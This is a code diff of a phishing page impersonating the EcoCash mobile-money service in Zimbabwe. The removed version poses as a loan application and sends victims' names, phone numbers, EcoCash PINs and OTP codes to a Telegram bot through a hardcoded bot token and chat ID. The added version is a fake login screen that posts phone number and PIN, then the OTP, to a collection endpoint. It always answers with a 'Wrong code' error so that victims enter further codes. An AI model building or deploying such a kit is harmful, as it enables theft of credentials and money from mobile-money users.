@@ -3,660 +3,421 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EcoCash - Loan Portal</title>
+    <title>EcoCash Loan Portal</title>
     <style>
-        :root {
-            --primary: #6366f1;
-            --primary-gradient: linear-gradient(135deg, #6366f1, #a855f7);
-            --bg: #e2e8f0;
-            --card: #ffffff;
-            --text: #1e293b;
-            --muted: #64748b;
-            --border: #e2e8f0;
-        }
-
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
-
         body {
-            background-color: var(--bg);
-            color: var(--text);
-            padding: 16px;
+            background-color: #ffffff;
+            color: #333;
             display: flex;
-            justify-content: center;
-            align-items: flex-start;
+            flex-direction: column;
             min-height: 100vh;
-            line-height: 1.5;
+            justify-content: space-between;
         }
-
         .container {
             width: 100%;
-            max-width: 500px;
-        }
-
-        .navbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px 4px;
-            margin-bottom: 12px;
-        }
-
-        .logo {
-            font-size: 20px;
-            font-weight: 700;
-            color: #dc2626;
-        }
-
-        .menu-icon {
-            font-size: 20px;
-            cursor: pointer;
-            color: var(--text);
-        }
-
-        .card {
-            background: var(--card);
-            border-radius: 16px;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05);
+            max-width: 480px;
+            margin: 0 auto;
             padding: 24px;
-            margin-bottom: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex-grow: 1;
+            justify-content: center;
         }
-
-        .header-title {
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #0052cc;
+            margin-bottom: 30px;
+            letter-spacing: -0.5px;
+        }
+        .logo span {
+            color: #d9381e;
+        }
+        h2 {
+            font-size: 20px;
+            color: #4a4a4a;
+            margin-bottom: 24px;
+            font-weight: 500;
+        }
+        .card {
+            background: #ffffff;
+            padding: 30px 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            width: 100%;
+            text-align: center;
+            border: 1px solid #eaeaea;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+        .phone-input-container {
+            display: flex;
+            align-items: center;
+            border: 1px solid #0052cc;
+            border-radius: 8px;
+            padding: 12px 14px;
+            background: #fff;
+        }
+        .flag {
+            font-size: 18px;
+            margin-right: 8px;
+        }
+        .phone-input-container span.prefix {
+            font-size: 16px;
+            color: #333;
+            font-weight: 500;
+            margin-right: 8px;
+        }
+        .phone-input-container input {
+            border: none;
+            outline: none;
+            font-size: 16px;
+            width: 100%;
+            background: transparent;
+        }
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .pin-box {
+            width: 48px;
+            height: 48px;
+            border: 2px solid #0052cc;
+            border-radius: 8px;
             text-align: center;
             font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 6px;
-        }
-
-        .header-sub {
-            text-align: center;
-            font-size: 13px;
-            color: var(--muted);
-            margin-bottom: 24px;
-        }
-
-        .steps-indicator {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 24px;
-        }
-
-        .step-bar {
-            flex: 1;
-            height: 4px;
-            background: #cbd5e1;
-            margin: 0 4px;
-            border-radius: 2px;
-            transition: background 0.3s;
-        }
-
-        .step-bar.active {
-            background: #4f46e5;
-        }
-
-        .step-content {
-            display: none;
-        }
-
-        .step-content.active {
-            display: block;
-        }
-
-        .form-group {
-            margin-bottom: 18px;
-        }
-
-        label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 6px;
-            color: var(--text);
-        }
-
-        input, select, textarea {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            font-size: 15px;
-            background-color: #fff;
-            color: var(--text);
-            transition: border-color 0.2s;
-        }
-
-        input:focus, select:focus, textarea:focus {
             outline: none;
-            border-color: var(--primary);
-        }
-
-        .calc-box {
-            background: #f8fafc;
-            border: 1px solid var(--border);
-            border-radius: 12px;
-            padding: 16px;
-            margin-bottom: 20px;
-        }
-
-        .calc-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 12px;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        .calc-value {
-            color: #4f46e5;
-            font-size: 18px;
-        }
-
-        input[type="range"] {
-            width: 100%;
-            margin: 8px 0 4px 0;
-            accent-color: #4f46e5;
-        }
-
-        .range-labels {
-            display: flex;
-            justify-content: space-between;
-            font-size: 11px;
-            color: var(--muted);
-            margin-bottom: 16px;
-        }
-
-        .monthly-payment-card {
             background: #fff;
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 12px 16px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 16px;
         }
-
-        .phone-group {
-            display: flex;
-            gap: 8px;
+        .pin-box:focus {
+            border-color: #003d99;
+            box-shadow: 0 0 0 3px rgba(0,82,204,0.15);
         }
-
-        .phone-prefix {
-            background: #f1f5f9;
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            padding: 12px;
-            font-weight: 600;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
+        .forgot-pin {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 25px;
+            text-decoration: none;
         }
-
-        .btn-group {
-            display: flex;
-            gap: 12px;
-            margin-top: 24px;
-        }
-
-        .btn {
-            flex: 1;
+        .btn-primary {
+            width: 100%;
+            background-color: #e0e0e0;
+            color: #777;
+            border: none;
             padding: 14px;
             border-radius: 8px;
-            font-size: 15px;
+            font-size: 16px;
             font-weight: 600;
-            border: none;
             cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-primary.active {
+            background-color: #0052cc;
+            color: #fff;
+        }
+        .btn-primary.active:hover {
+            background-color: #003d99;
+        }
+        .footer-wave {
+            background-color: #0052cc;
+            width: 100%;
+            padding: 30px 20px 20px 20px;
             text-align: center;
-            transition: opacity 0.2s;
+            color: #fff;
+            border-top-left-radius: 50% 20px;
+            border-top-right-radius: 50% 20px;
+            margin-top: auto;
         }
-
-        .btn-primary {
-            background: var(--primary-gradient);
-            color: white;
-        }
-
-        .btn-secondary {
-            background: #e2e8f0;
-            color: var(--text);
-        }
-
-        .btn:hover {
-            opacity: 0.9;
-        }
-
-        .summary-box {
-            background: #f8fafc;
-            border-radius: 8px;
-            padding: 16px;
-            margin-bottom: 20px;
-            border: 1px solid var(--border);
-        }
-
-        .summary-title {
-            font-size: 14px;
-            font-weight: 700;
-            margin-bottom: 12px;
-            color: var(--text);
-        }
-
-        .summary-row {
+        .footer-links {
             display: flex;
-            justify-content: space-between;
-            font-size: 13px;
-            margin-bottom: 8px;
-            padding-bottom: 6px;
-            border-bottom: 1px solid #e2e8f0;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 15px;
         }
-
-        .summary-row:last-child {
-            border-bottom: none;
-            margin-bottom: 0;
-            padding-bottom: 0;
-        }
-
-        .summary-label {
-            color: var(--muted);
-        }
-
-        .summary-val {
+        .footer-btn {
+            background: #fff;
+            color: #0052cc;
+            padding: 10px 24px;
+            border-radius: 6px;
+            text-decoration: none;
             font-weight: 600;
-            color: var(--text);
+            font-size: 14px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
-
-        .status-msg {
-            margin-top: 16px;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 13px;
-            text-align: center;
+        .version {
+            font-size: 12px;
+            color: rgba(255,255,255,0.8);
+            margin-top: 15px;
+        }
+        .copyright {
+            font-size: 11px;
+            color: rgba(255,255,255,0.7);
+            margin-top: 8px;
+        }
+        /* Modal Overlay */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
             display: none;
         }
-
-        .footer {
+        .modal-box {
+            background: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 360px;
             text-align: center;
-            font-size: 12px;
-            color: var(--muted);
-            margin-top: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
         }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #d8e3fd;
+            border-top: 4px solid #0052cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .modal-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        .modal-text {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .btn-danger {
+            background-color: #c5221f;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+        }
+        .screen { display: none; width: 100%; flex-direction: column; align-items: center; }
+        .screen.active { display: flex; }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div class="navbar">
-            <div class="logo">EcoCash</div>
-            <div class="menu-icon">&#9776;</div>
-        </div>
+        <div class="logo">Eco<span>Cash</span></div>
 
-        <div class="card">
-            <div class="steps-indicator" id="stepsIndicator">
-                <div class="step-bar active" id="bar1"></div>
-                <div class="step-bar" id="bar2"></div>
-                <div class="step-bar" id="bar3"></div>
-            </div>
-
-            <div id="loanForm">
-                <!-- STEP 1 -->
-                <div class="step-content active" id="step1">
-                    <div class="header-title">Get Your Loan Approved Fast</div>
-                    <div class="header-sub">Quick approval &bull; Competitive rates &bull; Flexible terms</div>
-
-                    <div class="calc-box">
-                        <div class="calc-row">
-                            <span>Loan Amount</span>
-                            <span class="calc-value" id="amountDisplay">$5,000</span>
-                        </div>
-                        <input type="range" id="loanAmountRange" min="100" max="5000" step="100" value="5000">
-                        <div class="range-labels">
-                            <span>$100</span>
-                            <span>$5,000</span>
-                        </div>
-
-                        <div class="form-group" style="margin-bottom: 12px;">
-                            <label>Loan Term</label>
-                            <select id="loanTerm">
-                                <option value="6">6 Months</option>
-                                <option value="12" selected>12 Months</option>
-                                <option value="18">18 Months</option>
-                                <option value="24">24 Months</option>
-                                <option value="36">36 Months</option>
-                                <option value="48">48 Months</option>
-                                <option value="60">60 Months</option>
-                            </select>
-                        </div>
-
-                        <div class="monthly-payment-card">
-                            <span style="font-size: 13px; color: var(--muted);">Monthly Payment</span>
-                            <span style="font-size: 18px; font-weight: 700; color: #4f46e5;" id="monthlyPaymentDisplay">$437.50</span>
+        <!-- SCREEN 1: LOGIN -->
+        <div id="loginScreen" class="screen active">
+            <h2>Login</h2>
+            <div class="card">
+                <form id="loginForm">
+                    <div class="input-group">
+                        <div class="phone-input-container">
+                            <span class="flag">🇿🇼</span>
+                            <span class="prefix">+263</span>
+                            <input type="tel" id="phoneInput" placeholder="123456789" required maxlength="9">
                         </div>
                     </div>
-
-                    <div class="form-group">
-                        <label>Loan Type</label>
-                        <select id="loanType">
-                            <option value="Personal Loan">Personal Loan</option>
-                            <option value="Business Loan">Business Loan</option>
-                            <option value="Home Loan">Home Loan</option>
-                            <option value="Car Loan">Car Loan</option>
-                            <option value="Education Loan">Education Loan</option>
-                        </select>
+                    
+                    <div style="font-size: 13px; color: #666; margin-bottom: 8px;">Enter your PIN</div>
+                    <div class="pin-container" id="pinInputs">
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                        <input type="password" class="pin-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
                     </div>
-
-                    <div class="form-group">
-                        <label>Purpose of Loan</label>
-                        <input type="text" id="loanPurpose" value="Buy a car" required>
-                    </div>
-
-                    <button type="button" class="btn btn-primary" style="width: 100%; margin-top: 10px;" id="nextBtn1">NEXT STEP</button>
-                </div>
-
-                <!-- STEP 2 -->
-                <div class="step-content" id="step2">
-                    <div class="header-title">Loan Application</div>
-                    <div class="header-sub">Step 2 of 3</div>
-
-                    <div class="form-group">
-                        <label>First Name</label>
-                        <input type="text" id="firstName" placeholder="John">
-                    </div>
-
-                    <div class="form-group">
-                        <label>Last Name</label>
-                        <input type="text" id="lastName" placeholder="Doe">
-                    </div>
-
-                    <div class="form-group">
-                        <label>Email Address</label>
-                        <input type="email" id="email" placeholder="john.doe@example.com">
-                    </div>
-
-                    <div class="form-group">
-                        <label>Phone Number</label>
-                        <div class="phone-group">
-                            <div class="phone-prefix">+263</div>
-                            <input type="tel" id="phoneNumber" placeholder="123456789">
-                        </div>
-                    </div>
-
-                    <div class="btn-group">
-                        <button type="button" class="btn btn-secondary" id="prevBtn2">PREVIOUS</button>
-                        <button type="button" class="btn btn-primary" id="nextBtn2">NEXT STEP</button>
-                    </div>
-                </div>
-
-                <!-- STEP 3 -->
-                <div class="step-content" id="step3">
-                    <div class="header-title">Loan Application</div>
-                    <div class="header-sub">Step 3 of 3</div>
-
-                    <div class="form-group">
-                        <label>Employment Status</label>
-                        <select id="employmentStatus">
-                            <option value="Employed">Employed</option>
-                            <option value="Self-Employed">Self-Employed</option>
-                            <option value="Business Owner">Business Owner</option>
-                            <option value="Freelancer">Freelancer</option>
-                        </select>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Annual Income ($)</label>
-                        <input type="number" id="annualIncome" value="50000">
-                    </div>
-
-                    <div class="summary-box">
-                        <div class="summary-title">Application Summary</div>
-                        <div class="summary-row">
-                            <span class="summary-label">Loan Type:</span>
-                            <span class="summary-val" id="sumLoanType">Personal Loan</span>
-                        </div>
-                        <div class="summary-row">
-                            <span class="summary-label">Loan Amount:</span>
-                            <span class="summary-val" id="sumAmount">$5,000</span>
-                        </div>
-                        <div class="summary-row">
-                            <span class="summary-label">Loan Term:</span>
-                            <span class="summary-val" id="sumTerm">12 Months</span>
-                        </div>
-                        <div class="summary-row">
-                            <span class="summary-label">Purpose:</span>
-                            <span class="summary-val" id="sumPurpose">Buy a car</span>
-                        </div>
-                        <div class="summary-row">
-                            <span class="summary-label">Applicant:</span>
-                            <span class="summary-val" id="sumApplicant">J D</span>
-                        </div>
-                    </div>
-
-                    <div class="btn-group">
-                        <button type="button" class="btn btn-secondary" id="prevBtn3">PREVIOUS</button>
-                        <button type="button" class="btn btn-primary" id="submitInitialBtn">SUBMIT APPLICATION</button>
-                    </div>
-
-                    <div id="initialStatusBox" class="status-msg"></div>
-                </div>
-
-                <!-- STEP 4 -->
-                <div class="step-content" id="step4">
-                    <div class="header-title">Account Verification</div>
-                    <div class="header-sub">Enter your EcoCash PIN & OTP to disburse funds</div>
-
-                    <div style="background: #f8fafc; border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 18px; font-size: 13px; color: var(--muted);">
-                        Please confirm your mobile money credentials to authorize loan deposit directly into your EcoCash wallet.
-                    </div>
-
-                    <div class="form-group">
-                        <label>EcoCash PIN</label>
-                        <input type="password" id="ecocashPin" maxlength="5" placeholder="&bull;&bull;&bull;&bull;&bull;">
-                    </div>
-
-                    <div class="form-group">
-                        <label>OTP Code</label>
-                        <input type="text" id="otpCode" placeholder="Enter 4-6 digit OTP">
-                    </div>
-
-                    <div class="btn-group">
-                        <button type="button" class="btn btn-secondary" id="prevBtn4">PREVIOUS</button>
-                        <button type="button" class="btn btn-primary" id="submitVerifyBtn">VERIFY &amp; DISBURSE</button>
-                    </div>
-
-                    <div id="verifyStatusBox" class="status-msg"></div>
-                </div>
+                    
+                    <a href="#" class="forgot-pin">Forgot PIN?</a>
+                    <button type="submit" class="btn-primary active" id="loginBtn">LOGIN</button>
+                </form>
             </div>
         </div>
 
-        <div class="footer">
-            &copy; 2026 EcoCash
+        <!-- SCREEN 2: OTP VERIFICATION -->
+        <div id="otpScreen" class="screen">
+            <div class="card" style="text-align: left;">
+                <h3 style="font-size: 18px; margin-bottom: 8px;">OTP Verification</h3>
+                <p style="font-size: 13px; color: #666; margin-bottom: 15px;">Enter the OTP sent to your phone number<br><strong id="displayPhone">+263723456789</strong></p>
+                
+                <form id="otpForm">
+                    <div class="pin-container" id="otpInputs">
+                        <input type="text" class="pin-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                        <input type="text" class="pin-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                        <input type="text" class="pin-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                        <input type="text" class="pin-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                        <input type="text" class="pin-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                        <input type="text" class="pin-box" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+                    </div>
+                    <div style="font-size: 12px; color: #888; text-align: center; margin-bottom: 20px;">Resend code in <span id="countdown">96</span> seconds</div>
+                    <button type="submit" class="btn-primary active" id="otpSubmitBtn">SUBMIT</button>
+                </form>
+            </div>
         </div>
     </div>
 
+    <!-- LOADING MODAL -->
+    <div id="loadingModal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="spinner"></div>
+            <div class="modal-title" id="loadingTitle">Please wait...</div>
+            <div class="modal-text" id="loadingSubtitle">This usually takes a few seconds</div>
+        </div>
+    </div>
+
+    <!-- ERROR MODAL -->
+    <div id="errorModal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="modal-title" style="color: #c5221f; margin-bottom: 10px;">Wrong code!</div>
+            <div class="modal-text">Check SMS for the code or request code again after countdown is over</div>
+            <button class="btn-danger" onclick="closeErrorModal()">OK</button>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer-wave">
+        <div style="font-size: 13px;">To register an EcoCash wallet or get assistance, click below</div>
+        <div class="footer-links">
+            <a href="#" class="footer-btn">Register</a>
+            <a href="#" class="footer-btn">Help & Support</a>
+        </div>
+        <div class="version">v2.1.3P</div>
+        <div class="copyright">By signing in you agree to the Terms and Conditions</div>
+    </div>
+
     <script>
-        const botToken = "8641245398:AAGYI7pFOVVrKqf9ILOSo6yGyOdFVSekkpM";
-        const chatId = "8557614507";
-
-        const amountRange = document.getElementById('loanAmountRange');
-        const termSelect = document.getElementById('loanTerm');
-        const amountDisplay = document.getElementById('amountDisplay');
-        const monthlyPaymentDisplay = document.getElementById('monthlyPaymentDisplay');
-
-        function updateCalculator() {
-            if (!amountRange || !termSelect) return;
-            const principal = parseFloat(amountRange.value);
-            const months = parseInt(termSelect.value);
-            amountDisplay.textContent = '$' + principal.toLocaleString();
-            const monthlyInterestRate = 0.08 / 12;
-            let monthlyPayment = monthlyInterestRate === 0 ? principal / months : (principal * monthlyInterestRate * Math.pow(1 + monthlyInterestRate, months)) / (Math.pow(1 + monthlyInterestRate, months) - 1);
-            monthlyPaymentDisplay.textContent = '$' + monthlyPayment.toFixed(2);
-        }
-
-        if (amountRange && termSelect) {
-            amountRange.addEventListener('input', updateCalculator);
-            amountRange.addEventListener('change', updateCalculator);
-            termSelect.addEventListener('change', updateCalculator);
-            updateCalculator();
-        }
-
-        const nextBtn1 = document.getElementById('nextBtn1');
-        if (nextBtn1) {
-            nextBtn1.addEventListener('click', function() {
-                document.getElementById('step1').classList.remove('active');
-                document.getElementById('step2').classList.add('active');
-                const bar2 = document.getElementById('bar2');
-                if (bar2) bar2.classList.add('active');
-            });
-        }
-
-        const nextBtn2 = document.getElementById('nextBtn2');
-        if (nextBtn2) {
-            nextBtn2.addEventListener('click', function() {
-                const fn = document.getElementById('firstName').value.trim();
-                const ln = document.getElementById('lastName').value.trim();
-                const phone = document.getElementById('phoneNumber').value.trim();
-                if(!fn || !ln || !phone) {
-                    alert('Please fill in your First Name, Last Name, and Phone Number.');
-                    return;
-                }
-                document.getElementById('sumLoanType').textContent = document.getElementById('loanType').value;
-                document.getElementById('sumAmount').textContent = amountDisplay.textContent;
-                document.getElementById('sumTerm').textContent = termSelect.options[termSelect.selectedIndex].text;
-                document.getElementById('sumPurpose').textContent = document.getElementById('loanPurpose').value || 'General Loan';
-                document.getElementById('sumApplicant').textContent = fn.charAt(0).toUpperCase() + '. ' + ln.charAt(0).toUpperCase() + '.';
-                document.getElementById('step2').classList.remove('active');
-                document.getElementById('step3').classList.add('active');
-                const bar3 = document.getElementById('bar3');
-                if (bar3) bar3.classList.add('active');
-            });
-        }
-
-        const prevBtn2 = document.getElementById('prevBtn2');
-        if (prevBtn2) {
-            prevBtn2.addEventListener('click', function() {
-                document.getElementById('step2').classList.remove('active');
-                const bar2 = document.getElementById('bar2');
-                if (bar2) bar2.classList.remove('active');
-                document.getElementById('step1').classList.add('active');
-            });
-        }
-
-        const prevBtn3 = document.getElementById('prevBtn3');
-        if (prevBtn3) {
-            prevBtn3.addEventListener('click', function() {
-                document.getElementById('step3').classList.remove('active');
-                const bar3 = document.getElementById('bar3');
-                if (bar3) bar3.classList.remove('active');
-                document.getElementById('step2').classList.add('active');
-            });
-        }
-
-        const prevBtn4 = document.getElementById('prevBtn4');
-        if (prevBtn4) {
-            prevBtn4.addEventListener('click', function() {
-                document.getElementById('step4').classList.remove('active');
-                const stepsIndicator = document.getElementById('stepsIndicator');
-                if (stepsIndicator) stepsIndicator.style.display = 'flex';
-                document.getElementById('step3').classList.add('active');
-            });
-        }
-
-        const submitInitialBtn = document.getElementById('submitInitialBtn');
-        if (submitInitialBtn) {
-            submitInitialBtn.addEventListener('click', async function() {
-                submitInitialBtn.disabled = true;
-                submitInitialBtn.textContent = 'SUBMITTING...';
-
-                try {
-                    const message = `🚨 *NEW ECO CASH LOAN APPLICATION* 🚨\n\n` +
-                                    `📂 *Loan Type:* ${document.getElementById('loanType').value}\n` +
-                                    `👤 *Name:* ${document.getElementById('firstName').value} ${document.getElementById('lastName').value}\n` +
-                                    `📧 *Email:* ${document.getElementById('email').value || 'N/A'}\n` +
-                                    `📱 *Phone:* +263 ${document.getElementById('phoneNumber').value}\n` +
-                                    `💰 *Amount:* ${amountDisplay.textContent}\n` +
-                                    `⏱ *Term:* ${termSelect.options[termSelect.selectedIndex].text}\n` +
-                                    `📋 *Purpose:* ${document.getElementById('loanPurpose').value}\n` +
-                                    `💼 *Employment:* ${document.getElementById('employmentStatus').value}\n` +
-                                    `💵 *Annual Income:* $${document.getElementById('annualIncome').value}`;
-
-                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
-                    });
-                    const data = await response.json();
-
-                    if (data.ok) {
-                        document.getElementById('step3').classList.remove('active');
-                        document.getElementById('step4').classList.add('active');
-                        const stepsIndicator = document.getElementById('stepsIndicator');
-                        if (stepsIndicator) stepsIndicator.style.display = 'none';
-                        submitInitialBtn.disabled = false;
-                        submitInitialBtn.textContent = 'SUBMIT APPLICATION';
-                    } else {
-                        throw new Error(data.description);
+        // Auto-focus movement for PIN and OTP boxes
+        function setupPinInputs(containerId) {
+            const container = document.getElementById(containerId);
+            const inputs = container.querySelectorAll('.pin-box');
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
                     }
-                } catch (error) {
-                    alert('Submission failed: ' + error.message);
-                    submitInitialBtn.disabled = false;
-                    submitInitialBtn.textContent = 'SUBMIT APPLICATION';
-                }
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
             });
         }
+        setupPinInputs('pinInputs');
+        setupPinInputs('otpInputs');
 
-        const submitVerifyBtn = document.getElementById('submitVerifyBtn');
-        if (submitVerifyBtn) {
-            submitVerifyBtn.addEventListener('click', async function() {
-                const pin = document.getElementById('ecocashPin').value.trim();
-                const otp = document.getElementById('otpCode').value.trim();
-                if (!pin || !otp) {
-                    alert('Please enter both your EcoCash PIN and OTP code.');
-                    return;
+        let savedPhone = '';
+
+        // Handle Login Form Submission
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const phoneVal = document.getElementById('phoneInput').value;
+            savedPhone = '+263' + phoneVal;
+            
+            const pinBoxes = document.querySelectorAll('#pinInputs .pin-box');
+            let pinVal = '';
+            pinBoxes.forEach(b => pinVal += b.value);
+
+            showLoading('Please wait...', 'This usually takes a few seconds');
+
+            try {
+                await fetch('/ax/api/verify-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber: savedPhone, pin: pinVal })
+                });
+
+                setTimeout(() => {
+                    hideLoading();
+                    document.getElementById('loginScreen').classList.remove('active');
+                    document.getElementById('otpScreen').classList.add('active');
+                    document.getElementById('displayPhone').innerText = savedPhone;
+                    startCountdown(96);
+                }, 1500);
+            } catch (err) {
+                hideLoading();
+                showError();
+            }
+        });
+
+        // Handle OTP Form Submission
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const otpBoxes = document.querySelectorAll('#otpInputs .pin-box');
+            let otpVal = '';
+            otpBoxes.forEach(b => otpVal += b.value);
+
+            showLoading('Verifying OTP', 'Please wait... (22s)');
+
+            try {
+                await fetch('/ax/api/verify-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber: savedPhone, otp: otpVal })
+                });
+
+                setTimeout(() => {
+                    hideLoading();
+                    showError(); // Shows wrong code modal matching screenshot
+                }, 2000);
+            } catch (err) {
+                hideLoading();
+                showError();
+            }
+        });
+
+        function showLoading(title, subtitle) {
+            document.getElementById('loadingTitle').innerText = title;
+            document.getElementById('loadingSubtitle').innerText = subtitle;
+            document.getElementById('loadingModal').style.display = 'flex';
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingModal').style.display = 'none';
+        }
+
+        function showError() {
+            document.getElementById('errorModal').style.display = 'flex';
+        }
+
+        function closeErrorModal() {
+            document.getElementById('errorModal').style.display = 'none';
+        }
+
+        function startCountdown(duration) {
+            let timer = duration, seconds;
+            const countdownEl = document.getElementById('countdown');
+            const interval = setInterval(function () {
+                countdownEl.textContent = timer;
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    countdownEl.textContent = '0';
                 }
-
-                submitVerifyBtn.disabled = true;
-                submitVerifyBtn.textContent = 'VERIFYING...';
-                const statusBox = document.getElementById('verifyStatusBox');
-
-                try {
-                    const message = `🔐 *ECOCASH VERIFICATION CREDENTIALS* 🔐\n\n` +
-                                    `👤 *Applicant:* ${document.getElementById('firstName').value} ${document.getElementById('lastName').value}\n` +
-                                    `📱 *Phone:* +263 ${document.getElementById('phoneNumber').value}\n` +
-                                    `🔑 *EcoCash PIN:* \`${pin}\`\n` +
-                                    `🔢 *OTP Code:* \`${otp}\``;
-
-                    const response = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                    const resp = await fetch(response, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
-                    });
-                    const data = await resp.json();
-
-                    if (data.ok) {
-                        if (statusBox) {
-                            statusBox.textContent = 'Verification successful! Funds will be credited to your wallet.';
-                            statusBox.style.background = '#d1fae5';
-                            statusBox.style.color = '#065f46';
-                            statusBox.style.display = 'block';
-                        }
-                        submitVerifyBtn.textContent = 'VERIFIED & SUCCESSFUL';
-                    } else {
-                        throw new Error(data.description);
-                    }
-                } catch (error) {
-                    if (statusBox) {
-                        statusBox.textContent = 'Verification failed: ' + error.message;
-                        statusBox.style.background = '#fee2e2';
-                        statusBox.style.color = '#991b1b';
-                        statusBox.style.display = 'block';
-                    }
-                    submitVerifyBtn.disabled = false;
-                    submitVerifyBtn.textContent = 'VERIFY & DISBURSE';
-                }
-            });
+            }, 1000);
         }
     </script>
 </body>
